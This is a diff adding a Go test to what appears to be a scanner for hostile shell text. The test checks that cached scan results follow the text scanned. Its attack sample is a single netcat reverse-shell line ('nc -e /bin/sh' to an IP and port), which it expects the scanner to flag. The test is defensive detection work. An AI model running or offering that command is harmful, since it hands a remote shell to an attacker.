@@ -93,3 +93,44 @@ func TestParallelRuleScanFindingsStayInRuleOrder(t *testing.T) {
 		}
 	}
 }
+
+// TestParallelRuleScanKeptAnswersFollowTheText pins that the answers kept for a
+// large text are read only for that text: a second scan of the same text
+// answers what the first did, and a text of the same size that differs only in
+// a late attack line is not answered from the first text.
+func TestParallelRuleScanKeptAnswersFollowTheText(t *testing.T) {
+	if runtime.GOMAXPROCS(0) < 2 {
+		t.Skip("one processor: the scan stays on the calling goroutine")
+	}
+	generation := snapshotRulePackGeneration("")
+	filler := strings.Repeat("note lorem ipsum dolor sit amet consectetur adipiscing elit 123456\n", 2<<10)
+	attackLine := "nc -e /bin/sh 203.0.113.9 4444\n"
+	benign := filler + "echo " + strings.Repeat("x", len(attackLine)-len("echo \n")) + "\n"
+	attack := filler + attackLine
+	if len(benign) != len(attack) {
+		t.Fatalf("texts differ in size: %d, %d", len(benign), len(attack))
+	}
+	reported := func(text string) string {
+		var ids []string
+		for _, finding := range scanRuleGeneration(generation, text, "shell", ruleScanOptions{}) {
+			ids = append(ids, finding.RuleID)
+		}
+		return strings.Join(ids, ",")
+	}
+	want := reported(attack)
+	if !strings.Contains(want, "REVSHELL") {
+		t.Fatalf("the attack text reports %q, want a reverse shell rule", want)
+	}
+	quiet := reported(benign)
+	for range 2 {
+		if got := reported(benign); got != quiet {
+			t.Fatalf("benign text reports %q, then %q", quiet, got)
+		}
+		if got := reported(attack); got != want {
+			t.Fatalf("attack text reports %q, want %q", got, want)
+		}
+	}
+	if strings.Contains(quiet, "REVSHELL") {
+		t.Fatalf("benign text reports %q", quiet)
+	}
+}
